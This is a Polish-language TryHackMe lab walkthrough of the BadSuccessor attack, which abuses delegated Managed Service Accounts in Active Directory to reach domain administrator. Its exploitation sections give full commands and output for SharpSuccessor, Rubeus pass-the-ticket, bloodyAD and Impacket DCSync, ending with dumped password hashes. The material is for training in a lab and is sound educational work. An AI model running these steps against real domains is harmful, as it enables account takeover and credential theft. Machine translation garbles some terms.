---

Dla osób niezaznajomionych z usługą Microsoft **Active Directory** (OGŁOSZENIE), przypomina scentralizowany katalog umożliwiający administratorom kontrolowanie dostępu do różnych zasobów sieciowych. OGŁOSZENIE jest powszechne w wielu sieciach korporacyjnych; szacuje się, że ponad 20% sieci korporacyjnych opiera się na OGŁOSZENIE do zarządzania tożsamością i dostępem. Jeśli nie znasz OGŁOSZENIE, przed przystąpieniem do tego etapu zalecamy zapoznanie się z salą [Podstawy usługi Active Directory .](https://tryhackme.com/room/winadbasics)

W tej sali omówimy atak z eskalacją uprawnień, który wykorzystuje **delegowane konto usługi zarządzanej** (dMSA) do przejęcia dowolnego konta, pod warunkiem spełnienia określonych warunków. Atak ten został odkryty przez Yuvala Gordona z Akamai i opublikowany na blogu Security Research: [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory.(otwiera się w nowej karcie)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?)Mówiąc prościej, atak ten pozwala użytkownikowi kontrolującemu obiekt dMSA uzyskać dostęp do uprawnień administratora domeny.

W tym pokoju omówimy:

- Konto usługi zarządzanej (MSA) i dMSA
- Eksploatacja w środowisku laboratoryjnym
- Obecnie dostępne techniki łagodzenia

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

**Opcja 1: Użycie AttackBox**

Kliknij przycisk **„Uruchom AttackBox”** u góry tego pokoju. Gdy AttackBox będzie gotowy, będzie dostępny na podzielonym ekranie.

**Opcja 2: PonadVPNPołączenie**

Alternatywnie możesz połączyć się z siecią za pomocąVPN. Aby ustanowićVPNAby nawiązać połączenie z tą siecią, przejdź do [strony dostępu](https://tryhackme.com/access) , kliknij kartę **Sieci** , wybierz **JRecent-Threats-BadSuccessor** i kliknij przycisk **Pobierz plik konfiguracyjny** . Jeśli nie widzisz tego pliku do pobrania, upewnij się, że sieć w pokoju została uruchomiona i odczekaj kilka minut.

![Na karcie Sieci wybierz opcję Recent-Threats-BadSuccessor i kliknij przycisk Pobierz plik konfiguracyjny.](https://cdn-images.tryhackme.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1748596749223.png)

Następnie uruchom następujące polecenie z tego samego katalogu, w którym znajduje się TwójVPNplik konfiguracyjny znajduje się:

`sudo openvpn [your_configuration_file_name.ovpn]`

Jeśli masz problemy z połączeniem się z siecią VPN, sprawdź [ten artykuł pomocy](https://help.tryhackme.com/en/articles/6496058-troubleshooting-openvpn-on-linux-and-mac) .

**Uwaga :** **Nie** należy używać AttackBox i połączenia VPN jednocześnie.

## Sprawdzanie łączności z siecią

Możesz uruchomić `route`polecenie, aby sprawdzić, czy komputer atakującego może komunikować się z siecią docelową. Poniższy terminal pokazuje przykładowe dane wyjściowe.

Terminal AttackBox

```shell-session
root@attackbox:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    100    0        0 ens5
[...]
10.211.101.0    10.250.101.1    255.255.255.0   UG    1000   0        0 tun0
10.250.101.0    0.0.0.0         255.255.255.0   U     0      0        0 tun0
[...]
```

Alternatywnie możesz użyć `ip route`polecenia.

Terminal AttackBox

```shell-session
root@attackbox:~# ip route
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.157.170 metric 100
[...]
10.211.101.0/24 via 10.250.101.1 dev tun0 metric 1000
10.250.101.0/24 dev tun0 proto kernel scope link src 10.250.101.2
[...]
```

Sprawdź, czy `10.211.101.0`podsieć znajduje się w wynikach polecenia. Jeśli tak, Twój komputer powinien móc komunikować się z siecią docelową.

**Uwaga** : Należy pamiętać, że maszyna wirtualna **`10.211.101.20`nie odpowiada na`ping`** .

## Rozwiązywanie problemów z łącznością

Jeśli nie możesz połączyć się z siecią z poziomu AttackBoxa, otwórz terminal i uruchom polecenie `tryconnectme`. Spowoduje to uruchomienie skryptu rozwiązywania problemów:

Terminal AttackBox

```shell-session
root@attackbox:~# tryconnectme
[...]
Before we dive deeper, please make sure that you are only using the AttackBox
and do not have your network VPN profile running anywhere!

The AttackBox uses the same VPN profile as you would use on your own machine
and you are only allowed to run the VPN profile once!

If you are running in two places, stop the other VPN and restart the AttackBox please!

If you confirm that you are only using the AttackBox, press [Y], otherwise, the debugger will quit:
```

Gdy już upewnisz się, że łączysz się z siecią wyłącznie za pośrednictwem AttackBox, możesz wprowadzić następujący adres IP:`10.211.101.10`

Terminal AttackBox

```shell-session
[...]
In the network room, look at the network diagram and please provide an IP address being shown to you there.
Format should be X.X.X.X: 10.211.101.10

Trying to ping the VPN server at 10.211.101.250...
```

Następnie postępuj zgodnie z instrukcjami skryptu. Gdy skrypt poprosi o podanieVPNserwer, wpisz **Recent-Threats-BadSuccessor** .

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme).

Usługa Active Directory (OGŁOSZENIE) ma wiele typów kont, w tym konta użytkowników, komputerów i grup. Wśród kont użytkowników mamy konta usługowe różnego typu: tradycyjne konta usługowe i zarządzane konta usługowe.

Konto **usługi zarządzanej** (MSA) jest specjalnym rodzajem konta wOGŁOSZENIEUmożliwia uruchamianie **usług** lub zaplanowanych zadań w systemach MS Windows. Ich kluczową cechą jest to, że nie wymagają od użytkownika zarządzania hasłem. Istnieją trzy typy:

- **Samodzielne konto usługi zarządzanej** (sMSA) jest przeznaczone do obsługi usługi na pojedynczym komputerze. OGŁOSZENIEZarządza hasłem do konta, w tym domyślnie zmienia je co 30 dni. To konto usługi zostało wprowadzone w systemie Windows Server 2008 R2.
- **Konto usługi zarządzanej przez grupę** (gMSA) jest przeznaczone dla usług działających na wielu komputerach lub serwerach. PodobnieOGŁOSZENIEobsługuje hasło konta. To konto usługi zostało wprowadzone w systemie Windows Server 2012.
- **Delegowane zarządzane konto usług** (dMSA) to najnowszy dodatek do rodziny kont usług. Umożliwia ono migrację starszego konta usług na konto maszynowe, tj. z konta, które nie jestMSAdo dMSA. W przeciwieństwie do gMSA, którym zarządzaOGŁOSZENIEi umożliwia uruchomienie usługi na wielu serwerach. Konto dMSA jest zarządzane przez administratora i umożliwia uruchomienie usługi na określonym serwerze. Zostało wprowadzone w systemie Windows Server 2025 i można dowiedzieć się o nim więcej [tutaj.(otwiera się w nowej karcie)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview).

Atak BadSuccessor może zostać przeprowadzony, jeśli użytkownik kontroluje obiekt dMSA. Począwszy od możliwości kontrolowania obiektu dMSA, atakujący może przejąć rolę administratora domeny. Innymi słowy, możliwe są dwa scenariusze początkowe: atakujący uzyskuje kontrolę nad istniejącym obiektem dMSA lub udaje mu się utworzyć nowy dMSA.

Aby zbadać tę lukę w zabezpieczeniach, wcielisz się w dociekliwego pracownika IT, Terry'ego Byte'a, który otrzymał upoważnienie do sprawdzenia, jak podatny jest jego nowy komputer. OGŁOSZENIE Środowisko jest. Proszę użyć poniższych danych logowania Terry'ego Byte'a:

- Nazwa użytkownika:`tbyte`
- Hasło:`P@SSw0rd345`
- Domena:`tryhackme.local`
- Serwer Windows:`10.211.101.20`

Używając powyższych danych logowania, zalogujemy się do systemu MS Windows Server 2019 przez RDP. W terminalu AttackBoxa można użyć aplikacji Remmina do łączenia się ze zdalnymi pulpitami. (Aplikację Remmina można znaleźć w grupie **Internet** w menu **Aplikacje** ).

Po połączeniu z `10.211.101.20`ponadRDP, uruchom terminal Windows PowerShell i postępuj zgodnie z instrukcjami.

W pierwszym kroku Terry przygotował kilka skryptów i narzędzi i zapisał je w pliku `C:\PoC\`. Możesz użyć polecenia [Get-BadSuccessorOUPermissions.ps1(otwiera się w nowej karcie)](https://github.com/akamai/BadSuccessor)Skrypt identyfikujący konta, które mogą tworzyć dMSA w swoich jednostkach organizacyjnych (OU). Wyszukuje konta z określonymi uprawnieniami, jak pokazano w wierszu 63 poniżej.

PowerShellScenariusz

```powershell
$relevantRights = "CreateChild|GenericAll|WriteDACL|WriteOwner"
```

Uruchommy skrypt i sprawdźmy, które konta się pojawią.

Windows PowerShell

```powershell
PS C:\PoC> .\Get-BadSuccessorOUPermissions.ps1

Identity         OUs
--------         ---
TRYHACKME\hmann  {OU=LabOU,DC=tryhackme,DC=local}
TRYHACKME\tbyte  {OU=LabOU,DC=tryhackme,DC=local}
[...]
```

Jak pokazano na powyższym wyjściu terminala, udało nam się uzyskać listę użytkowników z niezbędnymi uprawnieniami.

Eksploatację można zainicjować ręcznie, tworząc dMSA wJednostka organizacyjnaże użytkownik ma dostęp do zapisu, a następnie modyfikując atrybut obiektu dMSA, aby symulować pomyślną migrację. Po wykonaniu tych dwóch kroków, uzyskanie biletu uprawniającego do otrzymania biletu (TGT) i uzyskanie uprawnień będzie możliwe. Możesz zapoznać się z [oryginalnym postem(otwiera się w nowej karcie)](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)Aby uzyskać więcej szczegółów, należy jednak w tym przypadku skorzystać ze skryptu lub programu, który wykona za nas te czynności ręcznie.

Solidny dowód koncepcji (PoC) jest [SharpSuccessor(otwiera się w nowej karcie)](https://github.com/logangoins/SharpSuccessor); jest napisany w C Sharp i wymaga kompilacji. Skompilowaliśmy go razem z [Rubeusem.(otwiera się w nowej karcie)](https://github.com/GhostPack/Rubeus)i udostępniliśmy je pod adresem `C:\PoC\`. Aby użyć SharpSuccessor, musimy użyć następującej składni:

`.\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator`

- Określ `/path:`jednostkę organizacyjną, do której użytkownik ma dostęp. Informacje na ten temat znajdziesz już w poprzednim zadaniu.
- Udostępnij kontu dostęp do tej jednostki organizacyjnej za pomocą `/account:`.
- Ustaw nazwę obiektu dMSA, który zostanie utworzony za pomocą `/name:`argumentu.
- Na koniec wybierz konto, które Cię interesuje `/impersonate:`.

`tbyte`Poniżej w terminalu pokazano pomyślne uruchomienie powyższego polecenia przy użyciu naszego konta :

Windows PowerShell

```powershell
PS C:\PoC> .\SharpSuccessor.exe add /path:"ou=LabOU,dc=tryhackme,dc=local" /account:tbyte /name:pentest_dmsa /impersonate:Administrator
   _____ _                      _____
  / ____| |                    / ____|
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|
                         | |
                         |_|
@_logangoins

[+] Adding dnshostname pentest_dmsa.tryhackme.local
[+] Adding samaccountname pentest_dmsa$
[+] Administrator's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=pentest_dmsa' in 'ou=LabOU,dc=tryhackme,dc=local'
[+] Successfully weaponized dMSA object
```

W następnym kroku możesz zażądać biletu TGT; jednym z prostych sposobów jest użycie Rubeusa za pomocą polecenia `.\Rubeus.exe tgtdeleg /nowrap`. Ta `tgtdeleg`opcja wykorzystuje mniej znaną funkcję nieograniczonej delegacji Kerberosa. Prosi system o podszywanie się pod bieżącego użytkownika i eksportowanie jego biletu TGT bezpośrednio z pamięci za pomocą prawidłowego wywołania API. Z drugiej strony, `/nowrap`opcja ta generuje wynik (zazwyczaj w formacie base64) w jednym wierszu, co idealnie nadaje się do kopiowania i wklejania bez problemów z formatowaniem. W poniższym terminalu możemy zobaczyć, jak generowany i wyświetlany jest bilet.

Windows PowerShell

```powershell
PS C:\PoC> .\Rubeus.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC-LAB2025-01.tryhackme.local'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +xZBdNT0tzepnndbK8iadIfT7630HRgb9p8WPmfafJw=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFvjCCBbqgAwIBBaEDAgEWooIEvTCCBLlhggS1MIIEsaADAgEFoREbD1RSWUhBQ0tNRS5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPVFJZSEFDS01FLkxPQ0FMo4IEbzCCBGugAwIBEqEDAgECooIEXQSCBFmW1f2Y
[...]
```

ZTGTKorzystając z niego `tgtdeleg`, możesz podszywać się pod konto dMSA i żądać usługi udzielania biletów (TGS) za pomocą następującego polecenia:

`.\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...`

- `/targetuser:pentest_dmsa$`jest kontem, pod które się podszywamy; jest to konto, które utworzyliśmy wcześniej za pomocą SharpSuccessor.
- `/service:krbtgt/tryhackme.local`to nazwa główna usługi (SPN), do której dążymy. W tym przypadku jest to konto przyznające bilety Kerberos.
- `/opsec`Nakazuje Rubeusowi przeprowadzanie kontroli bezpieczeństwa i unikanie nadmiernie hałaśliwego zachowania. Wyłącza ponowne wykorzystywanie biletów, wyłącza szyfrowanie RC4 (które może wywoływać alarmy) i zapewnia bardziej przyjazne dla EDR użytkowanie. Jeśli przeprowadzasz test penetracyjny, nie chcesz alarmować zespołu ds. bezpieczeństwa.
- `/dmsa`Skrót od „Device Management Service Account context” (kontekst konta usługi zarządzania urządzeniami). Informuje on Rubeusa, że ​​masz do czynienia z biletem konta komputera i że powinien on odpowiednio podążać ścieżkami protokołu Kerberos.
- `/ptt`Skrót od pass-the-ticket (przekaż bilet). Gdy Rubeus sfałszuje lub otrzyma TGS, zostanie on natychmiast wstrzyknięty do bieżącej sesji, dzięki czemu będzie dostępny do użycia; nie ma potrzeby zapisywania i odtwarzania.
- `**/ticket:doIFvjC...**`to Twój zakodowany w formacie base64 bilet TGT, który otrzymałeś po wcześniejszym uruchomieniu Rubeusa. Przekazujesz go Rubeusowi, aby mógł go użyć do **żądania nowegoTGSw imieniu użytkownika docelowego** .

Uruchomienie powyższego polecenia wygeneruje dla nas kolejny bilet.

Windows PowerShell

```powershell
PS C:\PoC> .\Rubeus.exe asktgs /targetuser:pentest_dmsa$ /service:krbtgt/tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIFvjC...
[...]

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for 'pentest_dmsa$' from 'tbyte'
[+] Sequence number is: 1760776142
[*] Using domain controller: DC-LAB2025-01.tryhackme.local (fe80::4940:40ad:96b3:e808%3)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):
[...]

  ServiceName              :  krbtgt/TRYHACKME.LOCAL
  ServiceRealm             :  TRYHACKME.LOCAL
  UserName                 :  pentest_dmsa$ (NT_PRINCIPAL)
  UserRealm                :  tryhackme.local
  StartTime                :  2025-05-29 10:33:36 AM
  EndTime                  :  2025-05-29 10:48:35 AM
  RenewTill                :  2025-06-05 10:14:09 AM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  BSsFPiodcapHvbXNFCI/r/GZmHYAuSmPXukvtgpEoqE=
  Current Keys for pentest_dmsa$: (aes256_cts_hmac_sha1) B0698CE98C5901D19CE371081F46ECD93D63CB32E3E70579CB269BD16F912093
```

Dzięki nowemu zgłoszeniu możemy zażądać dowolnego zgłoszenia serwisowego w kontekście administratora. Przejdźmy dalej `.\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB..`. To polecenie używa następujących elementów:

- `/user:pentest_dmsa$`Określa użytkownika, którego podszywasz się. W tym przypadku jest to konto komputerowe, które utworzyliśmy wcześniej.
- `/service:cifs/DC-LAB2025-01.tryhackme.local`to SPN usługi SMB/CIFS w systemie docelowym. Wskazujesz Rubeusowi dokładnie, gdzie i do której usługi chcesz uzyskać dostęp.

Windows PowerShell

```powershell
PS C:\PoC> .\Rubeus.exe asktgs /user:pentest_dmsa$ /service:cifs/DC-LAB2025-01.tryhackme.local /opsec /dmsa /nowrap /ptt /ticket:doIGLjCCB...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for '' from 'pentest_dmsa$'
[+] Sequence number is: 1865807991
[*] Using domain controller: DC-LAB2025-01.tryhackme.local (fe80::4940:40ad:96b3:e808%3)
[+] TGS request successful!
[*] '/opsec' passed and service ticket has the 'ok-as-delegate' flag set, requesting a delegated TGT.
[+] Sequence number is: 908008309
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

[...]

  ServiceName              :  cifs/DC-LAB2025-01.tryhackme.local
  ServiceRealm             :  TRYHACKME.LOCAL
  UserName                 :  pentest_dmsa$ (NT_PRINCIPAL)
  UserRealm                :  tryhackme.local
  StartTime                :  2025-05-29 10:44:51 AM
  EndTime                  :  2025-05-29 10:48:35 AM
  RenewTill                :  2025-06-05 10:14:09 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  iwNuiecYT5gzdCyhOxzGYKzrSDlc2glmnMnr5aEDvv0=
```

## Pulpit administratora

Mając bilet w pamięci, spróbujmy sprawdzić pulpit administratora domeny na kontrolerze domeny `DC-LAB2025-01`. Pomyślne wykorzystanie luki powinno zwrócić wynik podobny do poniższego.

Windows PowerShell

```powershell
PS C:\PoC> dir \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop\

    Directory: \\DC-LAB2025-01.tryhackme.local\c$\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/29/2025   9:02 AM            251 flag.txt

PS C:\PoC>
```

Te same kroki eksploatacji możemy wykonać również zLinuxmaszyna taka jak [Kali(otwiera się w nowej karcie)](https://www.kali.org/)korzystając z najnowszej wersji (2.1.18) [bloodyAD(otwiera się w nowej karcie)](https://github.com/CravateRouge/bloodyAD)i [Impacket(otwiera się w nowej karcie)](https://github.com/fortra/impacket)zestaw narzędzi.

## Konfigurowanie AttackBox

Aby skonfigurować **bloodyAD** na AttackBoxie, wykorzystamy [uv firmy astral-sh(otwiera się w nowej karcie)](https://github.com/astral-sh/uv)Umożliwia instalację pakietów Pythona w różnych środowiskach wirtualnych. Możemy go zainstalować za pomocą tego polecenia `curl -LsSf https://astral.sh/uv/install.sh | sh`.

Terminal AttackBox

```shell-session
root@attackbox:~# curl -LsSf https://astral.sh/uv/install.sh | sh

downloading uv 0.7.9 x86_64-unknown-linux-gnu
no checksums to verify
installing to /root/.local/bin
  uv
  uvx
everything's installed!
```

Następnie zainstalujemy **bloodyAD** korzystając z polecenia `uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD`.

- Tag `--python 3.13`pozwala nam zainstalować to narzędzie w środowisku Python 3.13, aby uniknąć błędów zależności
- Jeżeli instalacja zawiesza się na minutę podczas instalowania jednego z pakietów, wystarczy nacisnąć `CTRL+C`i ponownie wykonać polecenie

Terminal Linux

```shell-session
root@attackbox:~# uv tool install --python 3.13 git+https://github.com/CravateRouge/bloodyAD
Resolved 19 packages in 278ms
    Updated https://github.com/CravateRouge/bloodyAD (1c0f2159865eaa147a474221e09561eee2e1828a)
...
...
 + unicrypto==0.0.10
Installed 1 executable: bloodyAD
root@attackbox:~# bloodyAD -h
usage: bloodyAD [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k [KERBEROS ...]] [-f {b64,hex,aes,rc4,default}]
                [-c [CERTIFICATE]] [-s] --host HOST [--dc-ip DC_IP] [--dns DNS] [-t TIMEOUT] [--gc]
                [-v {QUIET,INFO,DEBUG}]
                {add,get,remove,set} ...

AD Privesc Swiss Army Knife

options:
  -h, --help            show this help message and exit
  -d, --domain DOMAIN   Domain used for NTLM authentication
  -u, --username USERNAME
                        Username used for NTLM authentication
  -p, --password PASSWORD
                        password or LMHASH:NTHASH for NTLM authentication, password or AES/RC4 key for kerberos,
                        password for certificate (Do not specify to trigger integrated windows authentication)
...
...
...
  -s, --secure          Try to use LDAP/GC over TLS aka LDAPS/GCS (default is no TLS)
  --host HOST           Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)
  --dc-ip DC_IP         IP of the DC (useful if you provided a --host which can't resolve)
  --dns DNS             IP of the DNS to resolve AD names (useful for inter-domain functions)
  -t, --timeout TIMEOUT
                        Connection timeout in seconds
  --gc                  Connect to Global Catalog (GC)
  -v, --verbose {QUIET,INFO,DEBUG}
                        Adjust output verbosity

Commands:
  {add,get,remove,set}
    add                 [ADD] function category
    get                 [GET] function category
    remove              [REMOVE] function category
    set                 [SET] function category
```

**Uwaga:** Należy pamiętać, że skrypty Impacket znajdują się w `/opt/impacket/examples/`katalogu AttackBox.

## Eksploatacja

Najpierw edytujmy `/etc/hosts`plik za pomocą ulubionego edytora tekstu, abyśmy mogli poprawnie komunikować się z kontrolerem domeny:

Terminal Linux

```shell-session
root@attackbox:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.211.101.10   DC-LAB2025-01.tryhackme.local tryhackme tryhackme DC-LAB2025-01
```

Następnie możemy sprawdzić, czy posiadamy jakiekolwiek uprawnienia wymienione w **zadaniu 4.** Możemy to zrobić za pomocą **bloodyAD** za pomocą następującego polecenia:

`bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail`

- Określamy **domenę** za pomocą `-d`flagi
- Używamy `-u`i `-p`do określenia użytych danych uwierzytelniających
- Flaga `--host`służy do określenia **w pełni kwalifikowanej nazwy domeny** (FQDN) kontrolera domeny
- Flaga `get writable --detail`służy do znajdowania wszelkich **zapisywalnych atrybutów** dla użytkownika, którego uwierzytelniamy

`tbyte`Poniżej w terminalu pokazano pomyślne uruchomienie powyższego polecenia przy użyciu naszego konta  :

Terminal Linux

```shell-session
root@attackbox:~# bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local get writable --detail
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tryhackme,DC=local
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Terry Byte,OU=OFFICE,DC=tryhackme,DC=local
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
...
...
distinguishedName: OU=LabOU,DC=tryhackme,DC=local
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
...
...
dSA: CREATE_CHILD
ipsecISAKMPPolicy: CREATE_CHILD
...
...
```

Widzimy, że mamy  `dSA: CREATE_CHILD`uprawnienia do `LabOU`jednostki organizacyjnej (OU). Teraz utworzymy obiekt dMSA za pomocą następującego polecenia:

`bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local add badSuccessor pentest2_dmsa`

- Opcje `add badSuccessor pentest2_dmsa`wykorzystają atak BadSuccessor do utworzenia obiektu dMSA o nazwie  **pentest2_dmsa**

Terminal Linux

```shell-session
root@attackbox:~# bloodyAD -d tryhackme.local -u 'tbyte' -p 'P@SSw0rd345' --host DC-LAB2025-01.tryhackme.local add badSuccessor pentest2_dmsa
[*] Creating DMSA pentest2_dmsa$ in OU=LabOU,DC=tryhackme,DC=local
[*] Impersonating: CN=Administrator,CN=Users,DC=tryhackme,DC=local

Realm        : TRYHACKME.LOCAL
Sname        : krbtgt/TRYHACKME.LOCAL
UserName     : pentest2_dmsa$
UserRealm    : tryhackme.local
StartTime    : 2025-06-01 17:09:52+00:00
EndTime      : 2025-06-02 03:09:52+00:00
RenewTill    : 2025-06-02 17:09:45+00:00
Flags        : renewable, forwardable, pre-authent, enc-pa-rep
Keytype      : 18
Key          : Mhy6eBls8ZUcp/+18Gzobjyoei9+gV/mOflY5yckr04=
EncodedKirbi : 

    doIGQzCCBj+gAwIBBaEDAgEWooIFJjCCBSJhggUeMIIFGqADAgEFoREbD1RSWUhBQ0tNRS5MT0NBTKIkMCKgAwIBAqEbMBkbBmty
    ...
    ...
    ...
    AgECoRswGRsGa3JidGd0Gw9UUllIQUNLTUUuTE9DQUw=
[+] dMSA TGT stored in ccache file pentest2_dmsa_ts.ccache

dMSA current keys found in TGS:
AES256: 0554f7dc79121dc1a38e639c90accae967fc37a26547445b8dab8771f619f177
AES128: 6cac5029502e1e1b2faef14942b3ce36
RC4: 848acc28b6855bcf16625d76deb38ebb

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: 984f755c74dda5d1ec46091043976fec
```

Tworzy i ustawia obiekt dMSA wywoływany `pentest2_dmsa`domyślnie podczas podszywania się pod konto administratora. Tworzy również plik **ccache** , który zawiera dane uwierzytelniające Kerberos używane do uwierzytelniania.

**Uwaga:** Należy pamiętać, że nazwa pliku ccache może być nieco inna.

Teraz zapiszemy plik **ccache**  w `KRB5CCNAME`zmiennej środowiskowej, co umożliwi nam wygenerowanie **zgłoszenia serwisowego** przy użyciu `getST.py`klasy Impacket za pomocą następujących poleceń:

`export KRB5CCNAME=pentest2_dmsa_ts.ccache`

- Zapisuję zawartość pliku ccache do zmiennej środowiskowej`KRB5CCNAME`

`python3 /opt/impacket/examples/getST.py -dc-ip 10.211.101.10 -spn 'cifs/DC-LAB2025-01.tryhackme.local' 'tryhackme.local/pentest2_dmsa$' -k -no-pass`

- Adres IP kontrolera domeny określamy za pomocą `-dc-ip`flagi
- Wybieramy **główną nazwę usługi** (SPN) za pomocą `-spn`flagi. Na potrzeby tego pokoju nie będziemy zagłębiać się w szczegóły dotyczące nazw SPN. Więcej informacji na ich temat znajdziesz [tutaj.(otwiera się w nowej karcie)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)
- Opcja `tryhackme.local/pentest2_dmsa$`określa domenę i konto, do którego chcemy się zalogować
- Opcje `-k -no-pass`wskazują, że chcemy korzystać z uwierzytelniania Kerberos i nie prosić o podanie hasła. `-k`Flaga odczytuje `KRB5CCNAME`zmienną środowiskową, jeśli nie podano żadnych danych uwierzytelniających.

Terminal Linux

```shell-session
root@attackbox:~# export KRB5CCNAME=pentest2_dmsa_ts.ccache
root@attackbox:~# python3 /opt/impacket/examples/getST.py -dc-ip 10.211.101.10 -spn 'cifs/DC-LAB2025-01.tryhackme.local' 'tryhackme.local/pentest2_dmsa$' -k -no-pass
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in pentest2_dmsa$.ccache
```

Zgłosiliśmy nowy bilet serwisowy i zapisaliśmy dane uwierzytelniające Kerberos w nowym pliku ccache. Możemy teraz przeprowadzić atak DCSync za pomocą `secretsdump.py`klasy Impacket. Spowoduje to wyodrębnienie wszystkich haszy NTLM domeny:

`export KRB5CCNAME=pentest_dmsa$.ccache`

- Zapisujemy nowy plik ccache do `KRB5CCNAME`zmiennej środowiskowej

`python3 /opt/impacket/examples/secretsdump.py -k -no-pass 'pentest2_dmsa$'@DC-LAB2025-01.tryhackme.local`

- Podobnie jak w przypadku `getST.py`polecenia, używamy uwierzytelniania Kerberos bez monitu o podanie hasła
- Opcje `'pentest2_dmsa$'@DC-LAB2025-01.tryhackme.local`określają, że logujemy się za `pentest2_dmsa$`pomocą pełnej nazwy domeny (FQDN)`DC-LAB2025-01.tryhackme.local`

Terminal Linux

```shell-session
root@attackbox:~# export KRB5CCNAME=pentest2_dmsa\$.ccache
root@attackbox:~# python3 /opt/impacket/examples/secretsdump.py -k -no-pass 'pentest2_dmsa$'@DC-LAB2025-01.tryhackme.local
Impacket v0.13.0.dev0+20250530.173014.ff8c200f - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf790ab966daff922068e393a964a35fb
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:db00c6d839xxxxxxxxxecc7ab82a009e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
